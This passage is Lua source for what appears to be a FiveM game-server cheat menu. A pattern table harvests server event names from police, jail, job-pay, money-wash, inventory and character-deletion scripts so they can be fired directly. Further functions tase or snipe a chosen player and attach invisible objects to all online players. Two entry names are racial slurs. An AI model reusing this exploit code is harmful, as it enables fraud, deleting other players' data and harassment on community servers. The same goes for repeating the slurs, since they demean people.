       resource = "esx_policejob",
       resourcelooklike = {"police"},
       file = {"client/main.lua"},
       lookfor = ", GetPlayerServerId%b(),",
       name = "police_exploit",
       noparam = false,
       },
   
       {
       resource = "esx_policejob",
       resourcelooklike = {"police"},
       file = {"client/main.lua"},
       lookfor = ", function%(%),",
       name = "esx_policejob_unrestrain",
       noparam = false,
       },
   
       {
       resource = "esx_policejob",
       resourcelooklike = {"police"},
       file = {"client/main.lua"},
       lookfor = ", GetPlayerServerId%(closestPlayer%)%),",
       name = "esx_policejob_handcuf",
       noparam = false,
       },
   
       {
       resource = "esx_policejob",
       resourcelooklike = {"police"},
       file = {"client/main.lua"},
       lookfor = ", GetPlayerServerId%(closestPlayer%)%),",
       name = "esx_policejob_drag",
       noparam = false,
       },
   
       {
       resource = "CarryPeople",
       resourcelooklike = {"carry"},
       file = {"cl_carry.lua"},
       lookfor = ", closestPlayer,",
       name = "carry_exploit",
       noparam = false,
       },
       
       {
       resource = "CarryPeople",
       resourcelooklike = {"carry"},
       file = {"cl_carry.lua"},
       lookfor = ",target",
       name = "carrypeople_stop",
       noparam = false,
       },
   
       {
       resource = "esx-qalle-jail",
       resourcelooklike = {"jail"},
       file = {"client/client.lua"},
       lookfor = ", function%(newJailTime%)",
       name = "qalle_jailer",
       noparam = false,
       },
   
       {
       resource = "esx_policejob",
       resourcelooklike = {"police"},
       file = {"client/main.lua"},
       lookfor = ", player, c",
       name = "community",
       noparam = false,
       },
   
       {
       resource = "esx_headbag",
       resourcelooklike = {"esx_headbag", "headbag"},
       file = {"main.lua"},
       lookfor = ", GetPlayerServerId%(closestPlayer%)%)",
       name = "esx_worek_sendclosest",
       noparam = false,
       },
   
       {
       resource = "bag",
       resourcelooklike = {"esx_bag", "bag"},
       file = {"client/client.lua"},
       lookfor = ", GetPlayerServerId%(closestPlayer%)%)",
       name = "vodka_bag_ApplyBag",
       noparam = false,
       },
   
       {
       resource = "esx_windowcleaner",
       resourcelooklike = {"esx_windowcleaner", "windowcleaner"},
       file = {"client/main.lua"},
       lookfor = "StartNPCJob%(%)",
       name = "esx_windowcleaner_GiveItem",
       noparam = false,
       },
   
       {
       resource = "esx_windowcleaner",
       resourcelooklike = {"esx_windowcleaner", "windowcleaner"},
       file = {"client/main.lua"},
       lookfor = "StartNPCJob%(%)",
       name = "esx_windowcleaner_stopVente",
       noparam = false,
       },
   
       {
       resource = "esx_windowcleaner",
       resourcelooklike = {"esx_windowcleaner", "windowcleaner"},
       file = {"client/main.lua"},
       lookfor = "StartNPCJob%(%)",
       name = "esx_windowcleaner_startVente",
       noparam = false,
       },
   
       {
       resource = "esx_poolcleaner",
       resourcelooklike = {"esx_poolcleaner", "poolcleaner"},
       file = {"client/main.lua"},
       lookfor = "StartNPCJob%(%)",
       name = "esx_poolcleaner_GiveItem",
       noparam = false,
       },
   
       {
       resource = "esx_poolcleaner",
       resourcelooklike = {"esx_poolcleaner", "poolcleaner"},
       file = {"client/main.lua"},
       lookfor = "StartNPCJob%(%)",
       name = "esx_poolcleaner_stopVente",
       noparam = false,
       },
   
       {
       resource = "esx_poolcleaner",
       resourcelooklike = {"esx_poolcleaner", "poolcleaner"},
       file = {"client/main.lua"},
       lookfor = "StartNPCJob%(%)",
       name = "esx_poolcleaner_startVente",
       noparam = false,
       },
   
       {
       resource = "esx_truckerjob",
       resourcelooklike = {"trucker"},
       file = {"client/main.lua"},
       lookfor = ", amount",
       name = "truckerjob_pay",
       noparam = false,
       },
   
       {
       resource = "gopostal_job",
       resourcelooklike = {"gopostal"},
       file = {"client/cl.lua"},
       lookfor = ", currentJobPay",
       name = "gopostal_pay",
       noparam = false,
       },
   
       {
       resource = "esx-qalle-jail",
       resourcelooklike = {"jail"},
       file = {"client/client.lua"},
       lookfor = ", jailTime%)",
       name = "qalle_unjail",
       noparam = false,
       },
   
       {
       resource = "esx_status",
       resourcelooklike = {"status"},
       file = {"client/main.lua"},
       lookfor = ", function%(name, val%)",
       name = "esx_status_refillstatus",
       noparam = false,
       },
   
       {
       resource = "esx_policejob",
       resourcelooklike = {"police"},
       file = {"client/main.lua"},
       lookfor = ", GetPlayerServerId%b(), \'society_police\', _U%b(), data.current.amount",
       name = "send_bill",
       noparam = false,
       },
   
       {
       resource = "ESX_CommunityService",
       resourcelooklike = {"CommunityService"},
       file = {"client/main.lua"},
       lookfor = ", function%(source%)",
       name = "communityservice_finishservice",
       noparam = false,
       },
       
       {
       resource = "esx_garbagejob",
       resourcelooklike = {"garbage"},
       file = {"client/main.lua"},
       lookfor = ", amount%)",
       name = "garbagejob_pay",
       noparam = false,
       },
   
       {
       resource = "TakeHostage",
       resourcelooklike = {"hostage"},
       file = {"cl_takehostage.lua"},
       lookfor = ", closestPlayer,",
       name = "Hostage_Exploit",
       noparam = false,
       },
   
       {
       resource = "baz_moneywas",
       resourcelooklike = {"baz_moneywas", "wash"},
       file = {"client/main.lua"},
       lookfor = ", id, amount%)",
       name = "baz_moneywash_retrieveMoney",
       noparam = false,
       },
   
       {
       resource = "esx_moneywash",
       resourcelooklike = {"wash"},
       file = {"client/main.lua"},
       lookfor = ", amount, zone",
       name = "Money_Wash",
       noparam = false,
       },
   
       {
       resource = "esx_moneywash",
       resourcelooklike = {"wash"},
       file = {"config.lua"},   
       lookfor = "%] = %{",
       name = "Money_Wash_Zone",
       noparam = false
       },
   
       {
       resource = "esx_moneywash",
       resourcelooklike = {"wash"},
       file = {"client/main.lua"},
       lookfor = ", amount",
       name = "Money_Wash_Old",
       noparam = false,
       },
   
       {
       resource = "esx_kashacters",
       resourcelooklike = {"kashacters"},
       file = {"client/main.lua"},
       lookfor = ", data.charid%)",
       name = "delete_DB",
       noparam = false
       },
   
       {
       resource = "esx_bus",
       resourcelooklike = {"bus"},
       file = {"client/main.lua"},
       lookfor = ", amount%)",
       name = "buss_pay",
       noparam = false
       },
   
       {
       resource = "99kr-burglary",
       resourcelooklike = {"burglary"},
       file = {"burglary_client.lua"},
       lookfor = ", values.item, rndm%)",
       name = "free_items",
       noparam = false
       },
   
       {
       resource = "esx_inventoryhud",
       resourcelooklike = {"inventoryhud"},
       file = {"client/player.lua"},
       lookfor = "function refreshPlayerInventory%(%)",
       name = "esx_inventoryhud_tradePlayerItems",
       noparam = false
       },
   
       {
       resource = "linden_inventory",
       resourcelooklike = {"inventory"},
       file = {"client/main.lua"},
       lookfor = ", GetPlayerServerId%(targetPlayer%)",
       name = "linden_inventory_openTargetInventory",
       noparam = false
       },
   
       {
       resource = "es_extended",
       resourcelooklike = {"extended"},
       file = {"client/common.lua"},
       lookfor = ", function%(cb%)",
       name = "esx_hook",
       noparam = false
       },
   
       {
       resource = "Badger_Tackle",
       resourcelooklike = {"tackle"},
       file = {"client/main.lua"},
       lookfor = ", GetPlayerServerId%(closestPlayer%)",
       name = "tp_all_to_me",
       noparam = false
       },
   
       {
       resource="esx_ambulancejob",
       resourcelooklike={"esx_ambulancejob","ambulance"},
       file={"client/job.lua","job.lua"},
       lookfor=", data.current.value%)",
       name="giveitem",
       noparam=false
       },
   
       {
       resource="esx_ambulancejob",
       resourcelooklike={"esx_ambulancejob","ambulance"},
       file={"client/job.lua","job.lua"},
       lookfor=", playerID%)",
       name="esx_ambulancejob_revive",
       noparam=false
       },
   
       {
       resource="esx_ambulancejob",
       resourcelooklike={"esx_ambulancejob","ambulance"},
       file={"client/main.lua","main.lua"},
       lookfor=", data.current.item, data.current.value%)",
       name="giveitem2",
       noparam=false
       },
   
       {
       resource="esx_garbrages",
       resourcelooklike={"esx_garbrages","garbrages"},
       file={"client/main.lua","main.lua"},
       lookfor=", function%(%)",
       name="esx_karlosmuertos_niggaleaksjenej",
       noparam=false
       },
   
       {
       resource="esx_ambulancejob",
       resourcelooklike={"esx_ambulancejob","ambulance"},
       file={"client/main.lua","main.lua"},
       lookfor=", GetPlayerServerId%(closestPlayer%)",
       name="esx_ambulancejob_revive",
       noparam=false
       },
   
       {
       resource="esx_ambulancejob",
       resourcelooklike={"esx_ambulancejob","ambulance"},
       file={"client/main.lua","main.lua"},
       lookfor=", function%b() ESX = obj end",
       name="esx",
       noparam=false
       },
   
       {
       resource = "next_driftuj",
       resourcelooklike = {"next_driftuj", "FiveM-DriftCounter", "driftcounter"},
       file = {"driftcounter_c.lua"},
       lookfor = ", cash %)",
       name = "driftcounter_payDrift",
       noparam = false
       },
   
       {
       resource = "DriftCounter",
       resourcelooklike = {"DriftCounter", "FiveM-DriftCounter", "driftcounter"},
       file = {"driftcounter_c.lua"},
       lookfor = ", cash %)",
       name = "driftcounter_payDrift",
       noparam = false
       },
   
       {
       resource = "dp-emotes",
       resourcelooklike = {"emotes", "emote", "dpemotes"},
       file = {"client/Syncing.lua"},
       lookfor = ", GetPlayerServerId%(target%), requestedemote, otheremote",
       name = "emote_nigger",
       noparam = false
       },
   
       {
       resource = "rl-inventory",
       resourcelooklike = {"inventory"},
       file = {"client/main.lua"},
       lookfor = ', \"trunk\", CurrentVehicle, other',
       name = "open_inv_ghetto",
       noparam = false
       },
   
       {
       resource = "esx_hifi",
       resourcelooklike = {"hifi", "esx-hifi", "esx-sound", "esx_sound", "sound"},
       file = {"client/main.lua", "client.lua"},
       lookfor = ', data.value, coords',
       name = "play_da_sound",
       noparam = false
       },
   }
   
   
   sum.f.GetResources = function()
       local resources = {}
       for i=0, sum.f.GetNumResources() do
           resources[i] = sum.f.GetResourceByFindIndex(i)
       end
       return resources
   end
   sum.f.GetResourceStatus = function(resource_name)
       if sum.f.GetResourceState(resource_name) == "started" or 
           string.upper(sum.f.GetResourceState(resource_name)) == "started" or 
           string.lower(sum.f.GetResourceState(resource_name)) == "started" then
           return true
       else
           return false
       end
   end
   
   sum.f.TriggerCustomEvent = function(server, event, ...)
       local payload = msgpack.pack({...})
       if server then
           sum.f.TriggerServerEventInternal(event, payload, payload:len())
       else
           sum.f.TriggerEventInternal(event, payload, payload:len())
       end
   end
   
   sum.f.getTrigger = function(d)
       local s, l;
       local tosub;
       if not sum.f.GetResourceStatus(d.resource) then return end
       for k, v in sum.curak.pairs(d.file) do
           local script;
           script = sum.f.LoadResourceFile(d.resource, v);
           if script == nil or script == "nil" or script:len() <= 0 then return end  
           if d.noparam then
               s, l = string.find(script, d.lookfor)
               if s == nil then
                   return
               else
                   local Various1, Various2 = string.find(script, 'TriggerServerEvent%b()', l)
                   if Various1 == nil then
                       return
                   end
                   local scriptneeker = string.sub(script, Various1, Various2)
                   local shouldtake, _ = string.gsub(scriptneeker, 'TriggerServerEvent', "")
                   shouldtake, _ = string.gsub(shouldtake, "'", "")
                   shouldtake, _ = string.gsub(shouldtake, '"', "")
                   shouldtake, _ = string.gsub(shouldtake, '%(', "")
                   shouldtake, _ = string.gsub(shouldtake, '%)', "")
                   sum.TR[d.name] = shouldtake;
                  
                   return
               end
           else
               s, l = string.find(script, '%b""' .. d.lookfor);
               tosub = '"';
               if s == nil then 
                   s, l = string.find(script, "%b''" .. d.lookfor);
                   tosub = "'"
               end
               if s == nil then return end
               local script2 = string.sub(script, s, l);
               local trigger_done, _ = string.gsub(script2, d.lookfor, "");
               trigger_done = trigger_done:gsub(tosub, '')
               sum.TR[d.name] = trigger_done;
       
               return
           end
       end
   end
   
   sum.f.UpdateAllTriggers = function()
       sum.curak.thr(function()
           sum.curak.wait(500)
           local allresources = sum.f.GetResources()
           for elcount, v in ipairs(sum.m.list) do
               for i = 0, #allresources do
                   local script = string.lower(allresources[i])
                   if type(v.resourcelooklike) == 'table' then
                       for E, JEJE in pairs(v.resourcelooklike) do
                           if string.find(script, JEJE) and  sum.f.GetResourceStatus(allresources[i]) then
                               v.resource = allresources[i]
                           end
                       end
                   else
                       if string.find(script, v.resourcelooklike) and  sum.f.GetResourceStatus(allresources[i]) then
                           v.resource = allresources[i]
                       end
                   end
               end
           end
           sum.curak.wait(100)
           for k, v in pairs(sum.m.list) do
               sum.f.getTrigger(v)
              sum.curak.wait(15)
           end
       end)
   end
   
   
   function sum.f.getmousepos()
       local x, y = sum.f.GetNuiCursorPosition()
       local w, h = sum.f.GetActiveScreenResolution()
       x = x / w ; y = y / h 
       return x, y
   end
   
   sum.f.rainbowRGB = function(frequency)
       local result = {}
       local curtime = sum.f.GetGameTimer() / 2000
       result.r = sum.curak.floor(sum.curak.sin(curtime * frequency + 0) * 127 + 128)
       result.g = sum.curak.floor(sum.curak.sin(curtime * frequency + 2) * 127 + 128)
       result.b = sum.curak.floor(sum.curak.sin(curtime * frequency + 4) * 127 + 128)
       return result
   end
   
   sum.f.kinput = function(TextEntry, ExampleText, MaxStringLength)
       sum.f.AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
       sum.f.DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
       blockinput = true
   
       while sum.f.UpdateOnscreenKeyboard() ~= 1 and sum.f.UpdateOnscreenKeyboard() ~= 2 do
           sum.curak.wait(0)
       end
   
       if sum.f.UpdateOnscreenKeyboard() ~= 2 then
           local Kboard = sum.f.GetOnscreenKeyboardResult()
           sum.curak.wait(500)
           blockinput = false
           return Kboard
       else
           sum.curak.wait(500)
           blockinput = false
           return Kboard
       end
   end
   
   sum.m.input = function(t2, r, maxstr, strup)
       local bool = true
       local text = r
       local getMousePosX, getMousePosY = sum.f.getmousepos()
       _x, _y = sum.f.drag['Input'].X - getMousePosX, sum.f.drag['Input'].X - getMousePosY
       while bool do
           sum.curak.wait(0)
           sum.f.DisableAllControlActions(0)
           sum.f.DisableAllControlActions(1)
           local getMousePosX, getMousePosY = sum.f.getmousepos()
           local drag_X = sum.f.drag['Input'].X - 0.5
           local drag_Y = sum.f.drag['Input'].Y - 0.5
           if sum.f.mouse(0.5+drag_X, 0.489+drag_Y, 0.202, 0.0188+0.0018) and sum.f.IsDisabledControlJustPressed(0, 24) then 
               _x = sum.f.drag['Input'].X - getMousePosX
               _y = sum.f.drag['Input'].Y - getMousePosY
               sum.f.drag['Input'].toggle = true
           elseif sum.f.IsDisabledControlReleased(0, 24) then
               sum.f.drag['Input'].toggle = false
           end
           if sum.f.drag['Input'].toggle then
               sum.f.drag['Input'].X = getMousePosX + _x
               sum.f.drag['Input'].Y = getMousePosY + _y
           end
   
           if strup then
               text = sum.curak.upper(text)
           end
   
           
           for k, v in sum.curak.pairs(sum.keys) do 
               if maxstr then 
                   if sum.curak.len(text) < maxstr then
                       if sum.f.IsDisabledControlJustPressed(0, v) then 
                           text = text..k 
                       end 
                   end
               else    
                   if sum.f.IsDisabledControlJustPressed(0, v) then 
                       text = text..k 
                   end 
               end
           end
           if sum.f.IsDisabledControlJustPressed(0, 22) then text = text..' ' end -- SPACE
           if sum.f.IsDisabledControlJustPressed(0, 177) then text = text:sub(1, -2) end -- BACKSPACE
           if sum.f.IsDisabledControlJustPressed(0, 191) then bool = not bool end -- RIP
           if sum.f.IsDisabledControlJustPressed(0, 322) then 
               return
           end
           if not bool then return text, v end -- RETURNING
           sum.f.DrawRect(0.5+drag_X, 0.489+drag_Y, 0.202, 0.0188+0.0018, 20, 20, 20, 255)
           sum.f.DrawRect(0.5+drag_X, 0.489+drag_Y, 0.201, 0.0188, 55, 55, 55, 255)
           sum.f.DrawRect(0.5+drag_X, 0.489+drag_Y, 0.2, 0.017, 20, 20, 20, 255)
           sum.f.drawText('</font>[five<font color="#70D900">sense</font>] '.. t2.. " ("..sum.curak.len(tostring(text)).. ") [INSERT = I, DEL = o, PAGEDOWN - J]", 0.4+drag_X, 0.479+0.011+drag_Y, 0.27, 4, false)
           sum.f.DrawRect(0.5+drag_X, 0.51+drag_Y, 0.202, 0.0188+0.0018, 20, 20, 20, 255)
           sum.f.DrawRect(0.5+drag_X, 0.51+drag_Y, 0.201, 0.0188, 55, 55, 55, 255)
           sum.f.DrawRect(0.5+drag_X, 0.51+drag_Y, 0.2, 0.017, 20, 20, 20, 255)
           sum.f.drawText(tostring(sum.curak.lower(text), 60), 0.4+drag_X, 0.5+0.011+drag_Y, 0.27, 4, false)
   
           local r, g, b = 255, 255, 255
           sum.f.SetTextColour(r, g, b, 255)
           local x, y = sum.f.getmousepos()
           sum.f.drawTextOutline('o', x-0.002, y, 0.2, 0, true, 255, 255, 255)
       end
   end
   
   function sum.f.drawText3D(x, y, z, text, r, g, b)
       sum.f.SetDrawOrigin(x, y, z, 0)
       sum.f.SetTextFont(0)
       sum.f.SetTextProportional(0)
       sum.f.SetTextScale(0.0, 0.20)
       sum.f.SetTextColour(r, g, b, 255)
       sum.f.SetTextDropshadow(0, 0, 0, 0, 255)
       sum.f.SetTextEdge(2, 0, 0, 0, 150)
       sum.f.SetTextDropShadow()
       sum.f.SetTextOutline()
       sum.f.SetTextEntry("STRING")
       sum.f.SetTextCentre(1)
       sum.f.AddTextComponentString(text)
       sum.f.EndTextCommandDisplayText(0.0, 0.0)
       sum.f.ClearDrawOrigin()
   end
   
   function sum.f.drawText3DNametag(x, y, z, text, r, g, b, a)
       sum.f.SetDrawOrigin(x, y, z, 0)
       sum.f.SetTextFont(0)
       sum.f.SetTextProportional(0)
       sum.f.SetTextScale(0.0, 0.15)
       sum.f.SetTextColour(r, g, b, a)
       sum.f.SetTextDropshadow(0, 0, 0, 0, 255)
       sum.f.SetTextEdge(2, 0, 0, 0, 150)
       sum.f.SetTextDropShadow()
       sum.f.SetTextOutline()
       sum.f.SetTextEntry("STRING")
       sum.f.SetTextCentre(1)
       sum.f.AddTextComponentString(text)
       sum.f.EndTextCommandDisplayText(0.0, 0.0)
       sum.f.ClearDrawOrigin()
   end
   
   function sum.f.tazehim()
       local ped = sum.f.GetPlayerPed(sel.selectedPlayer)
       local Coords = sum.f.GetEntityCoords(ped)		
       local bonecoords = sum.f.GetPedBoneCoords(ped, 23553, Coords)
       local bonecoords_2 = sum.f.GetPedBoneCoords(ped, 57005, Coords)
       sum.f.ShootSingleBulletBetweenCoords(bonecoords_2,bonecoords,1,true,sum.f.GetHashKey("WEAPON_STUNGUN"),sum.f.PlayerPedId(),true,false,1.0)
   end
   
   function sum.f.snipehim()
       local ped = sum.f.GetPlayerPed(sel.selectedPlayer)
       local Coords = sum.f.GetEntityCoords(ped)		
       local bonecoords = sum.f.GetPedBoneCoords(ped, 23553, Coords)
       local bonecoords_2 = sum.f.GetPedBoneCoords(ped, 57005, Coords)
       sum.f.ShootSingleBulletBetweenCoords(bonecoords_2,bonecoords,1,true,sum.f.GetHashKey("WEAPON_HEAVYSNIPER"),sum.f.PlayerPedId(),true,false,1.0)
   end
   
   
   
   function sum.f.onlineplayerforcefield()
       for k, v in pairs(sum.f.GetActivePlayers()) do
           local prop = sum.f.GetHashKey("ce_xr_ctr2")
           local ped = sum.f.GetPlayerPed(v)
           local silo = sum.f.CreateObject(prop, 0, 0, 0, true, true, true)
           sum.f.SetEntityAlpha(silo, 0, true)
           sum.f.SetEntityDynamic(silo, false)
           sum.f.AttachEntityToEntity(silo, ped, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
       end
   end
   
   function sum.f.vehiclepolice()
       if sum.f.IsPedInAnyVehicle(sum.f.GetPlayerPed(-1, 0)) then 
           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
           sum.f.SetNeonsOnVeh()
           sum.f.ToggleVehicleMod(veh, 22, true)
           sum.f.requestControlOnce(veh)
   
          sum.curak.thr(function()
               red = function()
                   sum.f.SetVehicleNeonLightsColour(veh, 255, 0, 0)
                   sum.f.SetVehicleCustomPrimaryColour(veh, 255, 0, 0)
                   sum.f.SetVehicleCustomSecondaryColour(veh, 255, 0, 0)
                   sum.f.SetVehicleXenonLightsColor(veh, 8)
               end
               while true do sum.curak.wait(500)  
                   red()
               end
           end)
           
           sum.curak.thr(function()
               blue = function()
               -- Blue
                   sum.curak.wait(500)
                   sum.f.SetVehicleCustomPrimaryColour(veh, 0, 0, 255)
                   sum.f.SetVehicleCustomSecondaryColour(veh, 0, 0, 255)
                   sum.f.SetVehicleNeonLightsColour(veh, 0, 0, 255)
                   sum.f.SetVehicleXenonLightsColor(veh, 1)   
               end
               while true do sum.curak.wait(500)  
                   blue()
               end
           end)
       end
   end
   
   function sum.f.chams(a)
       if a == 'Add' then 
           CreateThread(function()
               local txd = CreateRuntimeTxd('zykemboss')
               local duiObj = CreateDui('wtf', 460, 341)
               _G.duiObj = duiObj
               local dui = GetDuiHandle(duiObj)
               local tx = CreateRuntimeTextureFromDuiHandle(txd, 'wudywchuj', dui)
               local a, b = 'zykemboss', 'duiTex'
               local Textures ={"berd_diff_004_a_uni","hair_diff_001_a_uni","hair_diff_002_a_uni","hair_diff_003_a_uni","hair_diff_004_a_uni","hair_diff_005_a_uni","hair_diff_006_a_uni","hair_diff_007_a_uni","hair_diff_008_a_uni","hair_diff_009_a_uni","hair_diff_010_a_uni","hair_diff_011_a_uni","hair_diff_012_a_uni","hair_diff_013_a_uni","hair_diff_014_a_uni","head_diff_000_a_whi","head_diff_001_a_whi","head_diff_002_a_bla","head_diff_003_a_bla","head_diff_004_a_lat","head_diff_005_a_lat","head_diff_006_a_chi","head_diff_007_a_chi","head_diff_008_a_pak","head_diff_009_a_pak","head_diff_010_a_ara","head_diff_011_a_ara","head_diff_012_a_whi","head_diff_013_a_whi","head_diff_014_a_bla","head_diff_015_a_bla","head_diff_016_a_lat","head_diff_017_a_chi","head_diff_018_a_chi","head_diff_019_a_pak","head_diff_020_a_ara","head_diff_021_a_whi","head_diff_022_a_whi","head_diff_023_a_bla","head_diff_024_a_bla","head_diff_025_a_lat","head_diff_026_a_lat","head_diff_027_a_chi","head_diff_028_a_chi","head_diff_029_a_pak","head_diff_030_a_pak","head_diff_031_a_ara","head_diff_032_a_ara","head_diff_033_a_whi","head_diff_034_a_whi","head_diff_035_a_bla","head_diff_036_a_bla","head_diff_037_a_lat","head_diff_038_a_lat","head_diff_039_a_chi","head_diff_040_a_chi","head_diff_041_a_ara","head_diff_042_a_whi","head_diff_043_a_whi","head_diff_044_a_whi","head_diff_045_a_whi","lowr_diff_002_a_whi","lowr_diff_002_b_whi","lowr_diff_002_c_whi","lowr_diff_002_d_whi","lowr_diff_002_e_whi","lowr_diff_002_f_whi","lowr_diff_002_g_whi","lowr_diff_002_h_whi","lowr_diff_002_i_whi","lowr_diff_002_j_whi","lowr_diff_002_k_whi","lowr_diff_002_l_whi","lowr_diff_002_m_whi","lowr_diff_002_n_whi","lowr_diff_002_o_whi","lowr_diff_002_p_whi","lowr_diff_006_a_whi","lowr_diff_006_b_whi","lowr_diff_006_c_whi","lowr_diff_006_d_whi","lowr_diff_006_e_whi","lowr_diff_006_f_whi","lowr_diff_006_g_whi","lowr_diff_006_h_whi","lowr_diff_006_i_whi","lowr_diff_006_j_whi","lowr_diff_006_k_whi","lowr_diff_006_l_whi","lowr_diff_006_m_whi","lowr_diff_006_n_whi","lowr_diff_006_o_whi","lowr_diff_006_p_whi","lowr_diff_012_a_whi","lowr_diff_012_b_whi","lowr_diff_012_c_whi","lowr_diff_012_d_whi","lowr_diff_012_e_whi","lowr_diff_012_f_whi","lowr_diff_012_g_whi","lowr_diff_012_h_whi","lowr_diff_012_i_whi","lowr_diff_012_j_whi","lowr_diff_012_k_whi","lowr_diff_012_l_whi","lowr_diff_012_m_whi","lowr_diff_012_n_whi","lowr_diff_012_o_whi","lowr_diff_012_p_whi","lowr_diff_014_a_whi","lowr_diff_014_b_whi","lowr_diff_014_c_whi","lowr_diff_014_d_whi","lowr_diff_014_e_whi","lowr_diff_014_f_whi","lowr_diff_014_g_whi","lowr_diff_014_h_whi","lowr_diff_014_i_whi","lowr_diff_014_j_whi","lowr_diff_014_k_whi","lowr_diff_014_l_whi","lowr_diff_014_m_whi","lowr_diff_014_n_whi","lowr_diff_014_o_whi","lowr_diff_014_p_whi","lowr_diff_015_a_whi","lowr_diff_015_b_whi","lowr_diff_015_c_whi","lowr_diff_015_d_whi","lowr_diff_015_e_whi","lowr_diff_015_f_whi","lowr_diff_015_g_whi","lowr_diff_015_h_whi","lowr_diff_015_i_whi","lowr_diff_015_j_whi","lowr_diff_015_k_whi","lowr_diff_015_l_whi","lowr_diff_015_m_whi","lowr_diff_015_n_whi","lowr_diff_015_o_whi","lowr_diff_015_p_whi","uppr_diff_000_a_whi","uppr_diff_001_a_whi","uppr_diff_002_a_whi","uppr_diff_004_a_whi","uppr_diff_005_a_whi","uppr_diff_006_a_whi","uppr_diff_008_a_whi","uppr_diff_011_a_whi","uppr_diff_012_a_whi","uppr_diff_014_a_whi","uppr_diff_015_a_whi","jbib_009_u","hair_diff_015_a_uni","accs_diff_000_a_uni","accs_diff_000_b_uni","accs_diff_000_c_uni","accs_diff_000_d_uni","accs_diff_000_e_uni","accs_diff_000_f_uni","accs_diff_000_g_uni","accs_diff_000_h_uni","accs_diff_000_i_uni","accs_diff_000_j_uni","accs_diff_000_k_uni","accs_diff_000_l_uni","accs_diff_000_m_uni","accs_diff_000_n_uni","accs_diff_000_o_uni","accs_diff_000_p_uni","accs_diff_001_a_uni","accs_diff_001_b_uni","accs_diff_001_c_uni","accs_diff_001_d_uni","accs_diff_001_e_uni","accs_diff_001_f_uni","accs_diff_001_g_uni","accs_diff_001_h_uni","accs_diff_001_i_uni","accs_diff_001_j_uni","accs_diff_001_k_uni","accs_diff_001_l_uni","accs_diff_001_m_uni","accs_diff_001_n_uni","accs_diff_001_o_uni","accs_diff_001_p_uni","accs_diff_002_a_uni","accs_diff_002_b_uni","accs_diff_002_c_uni","accs_diff_002_d_uni","accs_diff_002_e_uni","accs_diff_002_f_uni","accs_diff_002_g_uni","accs_diff_002_h_uni","accs_diff_002_i_uni","accs_diff_002_j_uni","accs_diff_002_k_uni","accs_diff_002_l_uni","accs_diff_002_m_uni","accs_diff_002_n_uni","accs_diff_002_o_uni","accs_diff_002_p_uni","accs_diff_003_a_uni","accs_diff_003_b_uni","accs_diff_003_c_uni","accs_diff_003_d_uni","accs_diff_003_e_uni","accs_diff_003_f_uni","accs_diff_003_g_uni","accs_diff_003_h_uni","accs_diff_003_i_uni","accs_diff_003_j_uni","accs_diff_003_k_uni","accs_diff_003_l_uni","accs_diff_003_m_uni","accs_diff_003_n_uni","accs_diff_003_o_uni","accs_diff_003_p_uni","accs_diff_004_a_uni","accs_diff_004_b_uni","accs_diff_004_c_uni","accs_diff_004_d_uni","accs_diff_004_e_uni","accs_diff_004_f_uni","accs_diff_004_g_uni","accs_diff_004_h_uni","accs_diff_004_i_uni","accs_diff_004_j_uni","accs_diff_004_k_uni","accs_diff_004_l_uni","accs_diff_004_m_uni","accs_diff_004_n_uni","accs_diff_004_o_uni","accs_diff_004_p_uni","accs_diff_005_a_uni","accs_diff_005_b_uni","accs_diff_005_c_uni","accs_diff_005_d_uni","accs_diff_005_e_uni","accs_diff_005_f_uni","accs_diff_005_g_uni","accs_diff_005_h_uni","accs_diff_005_i_uni","accs_diff_005_j_uni","accs_diff_005_k_uni","accs_diff_005_l_uni","accs_diff_005_m_uni","accs_diff_005_n_uni","accs_diff_005_o_uni","accs_diff_005_p_uni","accs_diff_006_a_uni","accs_diff_006_b_uni","accs_diff_006_c_uni","accs_diff_006_d_uni","accs_diff_006_e_uni","accs_diff_006_f_uni","accs_diff_006_g_uni","accs_diff_006_h_uni","accs_diff_006_i_uni","accs_diff_006_j_uni","accs_diff_006_k_uni","accs_diff_006_l_uni","accs_diff_006_m_uni","accs_diff_006_n_uni","accs_diff_006_o_uni","accs_diff_006_p_uni","accs_diff_007_a_uni","accs_diff_007_b_uni","accs_diff_007_c_uni","accs_diff_007_d_uni","accs_diff_007_e_uni","accs_diff_007_f_uni","accs_diff_007_g_uni","accs_diff_007_h_uni","accs_diff_007_i_uni","accs_diff_007_j_uni","accs_diff_007_k_uni","accs_diff_007_l_uni","accs_diff_007_m_uni","accs_diff_007_n_uni","accs_diff_007_o_uni","accs_diff_007_p_uni","accs_diff_008_a_uni","accs_diff_008_b_uni","accs_diff_008_c_uni","accs_diff_008_d_uni","accs_diff_008_e_uni","accs_diff_008_f_uni","accs_diff_008_g_uni","accs_diff_008_h_uni","accs_diff_008_i_uni","accs_diff_008_j_uni","accs_diff_008_k_uni","accs_diff_008_l_uni","accs_diff_008_m_uni","accs_diff_008_n_uni","accs_diff_008_o_uni","accs_diff_008_p_uni","accs_diff_009_a_uni","accs_diff_009_b_uni","accs_diff_009_c_uni","accs_diff_009_d_uni","accs_diff_009_e_uni","accs_diff_009_f_uni","accs_diff_009_g_uni","accs_diff_009_h_uni","accs_diff_009_i_uni","accs_diff_009_j_uni","accs_diff_009_k_uni","accs_diff_009_l_uni","accs_diff_009_m_uni","accs_diff_009_n_uni","accs_diff_009_o_uni","accs_diff_009_p_uni","accs_diff_010_a_uni","accs_diff_010_b_uni","accs_diff_010_c_uni","accs_diff_010_d_uni","accs_diff_010_e_uni","accs_diff_010_f_uni","accs_diff_010_g_uni","accs_diff_010_h_uni","accs_diff_010_i_uni","accs_diff_010_j_uni","accs_diff_010_k_uni","accs_diff_010_l_uni","accs_diff_010_m_uni","accs_diff_010_n_uni","accs_diff_010_o_uni","accs_diff_010_p_uni","accs_diff_011_a_uni","accs_diff_011_b_uni","accs_diff_011_c_uni","accs_diff_011_d_uni","accs_diff_011_e_uni","accs_diff_011_f_uni","accs_diff_011_g_uni","accs_diff_011_h_uni","accs_diff_011_i_uni","accs_diff_011_j_uni","accs_diff_011_k_uni","accs_diff_011_l_uni","accs_diff_011_m_uni","accs_diff_011_n_uni","accs_diff_011_o_uni","accs_diff_011_p_uni","accs_diff_012_a_uni","accs_diff_012_b_uni","accs_diff_012_c_uni","accs_diff_012_d_uni","accs_diff_012_e_uni","accs_diff_012_f_uni","accs_diff_012_g_uni","accs_diff_012_h_uni","accs_diff_012_i_u